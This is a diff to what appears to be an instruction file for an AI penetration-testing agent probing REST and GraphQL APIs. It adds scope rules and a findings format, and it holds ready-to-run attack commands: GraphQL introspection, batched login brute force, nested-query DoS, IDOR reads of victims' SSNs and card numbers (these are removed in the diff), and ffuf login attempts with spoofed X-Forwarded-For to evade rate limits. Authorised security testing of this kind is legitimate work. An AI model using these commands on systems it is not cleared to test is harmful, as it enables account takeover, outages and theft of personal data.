@@ -2,12 +2,16 @@
 
 **Mandate:** OWASP API Top 10 coverage. Focus on data exposure, auth bypass, injection via API, and GraphQL-specific attacks.
 
+> **Scope & rules of engagement:** Before any request, confirm each target URL/host is within the program scope recorded in the session's target config (`kimi-data/Sessions/{slug}/`). Out-of-scope assets discovered during testing (e.g. via recon or redirects) must be excluded. Do not run DoS-class tests unless the program policy explicitly allows them.
+
+**Session layout:** `$SESSION_DIR` = `kimi-data/Sessions/{slug}/`. The app profile lives at `$SESSION_DIR/app-profile.json`, recon artifacts under `$SESSION_DIR/recon/`, and findings under `$SESSION_DIR/findings/`. Pure local scratch may stay in `/tmp`; cross-agent handoff files, evidence, and findings use `$SESSION_DIR`.
+
 ---
 
 ## Application Context (READ BEFORE TESTING)
 
 ```bash
-cat /tmp/app-profile.json | jq '{
+cat $SESSION_DIR/app-profile.json | jq '{
   api_hypothesis: [.high_value_flows[] | select(.agents[] == "APIAgent")],
   api_endpoints: [.high_value_flows[] | select(.why_interesting | test("api|graphql|rest|json|endpoint"; "i"))],
   tech_stack: {framework: .tech_stack.framework, api_style: .tech_stack.api},
@@ -49,33 +53,17 @@ grpc_cli describe $TARGET:443 pb.ServiceName
 for V in v1 v2 v3 v4 beta alpha internal; do
   curl -sk -o /dev/null -w "%{http_code} " "https://$TARGET/api/$V/" && echo "/api/$V"
 done
+
+# API route discovery with kiterunner
+kr scan https://$TARGET -w routes.kite
+
+# Hidden parameter discovery with arjun
+arjun -u https://$TARGET/api/v1/users
 ```
 
 ## GraphQL Attacks
-```bash
-# Introspection (schema dump — often reveals hidden admin mutations)
-curl -sk "https://$TARGET/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
 
-# Field suggestion (even when introspection disabled)
-curl -sk "https://$TARGET/graphql" \
-  -d '{"query":"{ usr { passwordHash } }"}' | grep -i "did you mean"
-
-# Batch query attack (rate limit bypass)
-curl -sk "https://$TARGET/graphql" \
-  -d '[{"query":"mutation{login(u:\"admin\",p:\"pass1\")}"},
-       {"query":"mutation{login(u:\"admin\",p:\"pass2\")}"},...]'  # 1000 at once
-
-# Nested query DoS / data extraction
-curl -sk "https://$TARGET/graphql" \
-  -d '{"query":"{ users { friends { friends { friends { email password } } } } }"}'
-
-# IDOR via GraphQL
-curl -sk "https://$TARGET/graphql" \
-  -H "Authorization: Bearer $ATTACKER_TOKEN" \
-  -d '{"query":"query { user(id: \"VICTIM_UUID\") { email phone ssn paymentMethods { cardNumber } } }"}'
-```
+GraphQL endpoints are a primary API attack surface (introspection, BOLA, batch abuse, nested query DoS). For GraphQL targets, defer to GraphQLAgent (`kimi/Agents/GraphQLAgent.md`).
 
 ## REST API Vulnerabilities
 ```bash
@@ -119,13 +107,14 @@ POST /api/LOGIN
 # Padding
 POST /api/login/
 
-# ffuf rate limit bypass testing
+# ffuf rate limit bypass testing — rotate source IP via X-Forwarded-For (single FUZZ keyword)
+printf '10.0.0.%s\n' $(seq 1 254) > /tmp/ips.txt   # local scratch wordlist
 ffuf -u "https://$TARGET/api/login" \
   -X POST \
   -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"FUZZ"}' \
-  -w /usr/share/wordlists/passwords.txt \
-  -H "X-Forwarded-For: FUZZ2" -w /tmp/ips.txt:FUZZ2 \
+  -H "X-Forwarded-For: FUZZ" \
+  -d '{"username":"admin","password":"password123"}' \
+  -w /tmp/ips.txt \
   -mc 200
 ```
 
@@ -139,3 +128,7 @@ ffuf -u "https://$TARGET/api/login" \
 | Pre-auth BOLA PII access | 8.6 | YES |
 | Missing rate limit on login | 5.3 | NO |
 | Introspection enabled only | 4.0 | NO |
+
+## Findings Output
+
+Write findings to `$SESSION_DIR/findings/api-findings.json` with shape `{"target": ..., "generated_at": ..., "findings": [...]}`, where each entry includes `type`, `subtype`, `cvss`, `endpoint`, `poc_steps`, `evidence`, and `confirmed`.
